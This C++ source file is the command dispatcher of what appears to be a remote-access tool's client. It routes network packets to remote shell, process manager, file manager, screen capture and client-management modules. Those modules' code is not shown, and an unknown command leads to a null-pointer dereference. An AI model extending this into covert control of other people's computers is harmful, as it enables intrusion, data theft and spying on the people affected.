#include "clientinformations.h"
#include "RemoteShell.h"
#include "ProcessManager.h"
#include "FilesManager.h"
#include "CaptureScreen.h"
#include "ClientMgmt.h"

#include "packetProcessor.h"



packetProcessor::packetProcessor() : 
ClientInformationsClass(nullptr), RemoteShellClass(nullptr), ProcessManagerClass(nullptr), FilesManagerClass(nullptr), CaptureScreenClass(nullptr)
{
}


packetProcessor::~packetProcessor() 
{
	for (auto const& value : m_functionList)
		delete value;
}



void packetProcessor::ProcessPacket(PACKET * packet) 
{
	FunctionBase *base = GetOrInitFunction(packet->_header.Command);
	base->ProcessPacket(packet);
}

FunctionBase *packetProcessor::GetOrInitFunction(int funcIdent)
{
	FunctionBase *myfunc = nullptr;
	vector<FunctionBase*>::iterator i;
	int pos = 0;
	for (i = m_functionList.begin(); i != m_functionList.end(); ++i)  
	{
		if (funcIdent == static_cast<FunctionBase*>(*i)->FunctionIdentity()) 
		{
			return *i;
		}
		pos++;
	}

	switch (funcIdent)
	{
		case _hello:
		case _clientInformation: 
		{
			myfunc = new clientinformations();
			break;
		}
		case _remoteShell: 
		{
			myfunc = new RemoteShell();
			break;
		}
		case _processManager: 
		{
			myfunc = new ProcessManager();
			break;
		}
		case _filesManager: 
		{
			myfunc = new FilesManager();
			break;
		}
		case _captureScreen: 
		{
			myfunc = new CaptureScreen();
			break;
		}
		case _clientMgmt:
		{
			myfunc = new ClientMgmt();
			break;
		}
		default:
		{
			break;
		}
	}

	m_functionList.push_back(myfunc);
	return myfunc;
}

